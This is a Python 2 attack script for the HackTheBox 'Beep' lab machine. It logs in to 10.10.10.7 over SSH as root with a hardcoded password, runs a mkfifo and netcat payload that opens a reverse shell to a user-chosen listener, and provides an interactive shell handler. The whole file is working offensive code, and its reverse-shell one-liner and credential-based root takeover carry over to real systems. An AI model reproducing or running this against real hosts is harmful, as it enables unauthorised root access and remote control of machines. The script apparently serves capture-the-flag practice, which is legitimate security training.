#!/usr/bin/env python

# HackTheBox - Beep - Instant Root Exploit

# Imports all needed libraries
from socket import *
from colorama import Fore, Style
import thread
import optparse
import paramiko


# Takes the LHOST and LPORT arguments from the user
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--lhost", dest="lhost", help="Specify the LHOST for the reverse shell")
    parser.add_option("-p", "--lport", dest="lport", help="Specify the LPORT for the reverse shell")
    (options, arguments) = parser.parse_args()
    if not options.lhost:
        parser.error("[-] Please specify the LHOST, use --help for more info")
    elif not options.lport:
        parser.error("[-] Please specify the LPORT, use --help for more info")
    return options


# Pre-set variables and creates new thread for the exploit
def start():
    try:
        global serversocket
        global buff
        serversocket = socket(AF_INET, SOCK_STREAM)
        buff = 1024
        addr = (options.lhost, int(options.lport))
        serversocket.bind(addr)
        serversocket.listen(10)
        print(Fore.GREEN + Style.BRIGHT + "\n[+] Started reverse shell handler" + Fore.RESET + Style.RESET_ALL)
        thread.start_new_thread(exploit, ())
        connection()
    except KeyboardInterrupt:
        print(Fore.RED + Style.BRIGHT + '\n\n[-] Exiting BeepShell...\n' + Fore.RESET + Style.RESET_ALL)
        exit()


# Creates the exploit and executes it
def exploit():
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect('10.10.10.7', username='root', password='jEhdIekWmdjE')
        chan = ssh.get_transport().open_session()
        chan.get_pty()
        f = chan.makefile()
        payload = 'mkfifo /tmp/shell; nc ' + options.lhost + ' ' + options.lport + ' 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell'
        chan.exec_command(payload)
        f.read()
        ssh.close()
    except KeyboardInterrupt:
        print(Fore.RED + Style.BRIGHT + '\n\n[-] Exiting BeepShell...\n' + Fore.RESET + Style.RESET_ALL)
        exit()


# Accepts the incoming connection and creates the shell
def connection():
    try:
        while True:
            clientsocket, clientaddr = serversocket.accept()
            print(Fore.GREEN + Style.BRIGHT + "[+] Successfully connected to root (user)\n" + Fore.RESET + Style.RESET_ALL)
            clientsocket.settimeout(3)
            while True:
                reply = raw_input(Fore.YELLOW + Style.BRIGHT + 'BeepShell ' + Fore.BLUE + Style.BRIGHT + '>> ' + Fore.RESET + Style.RESET_ALL)
                clientsocket.sendall(reply + "\n")
                try:
                    data = clientsocket.recv(buff)
                    print(data)
                except:
                    pass
    except KeyboardInterrupt:
        print(Fore.RED + Style.BRIGHT + '\n\n[-] Exiting BeepShell...\n' + Fore.RESET + Style.RESET_ALL)
        exit()


options = get_arguments()
start()
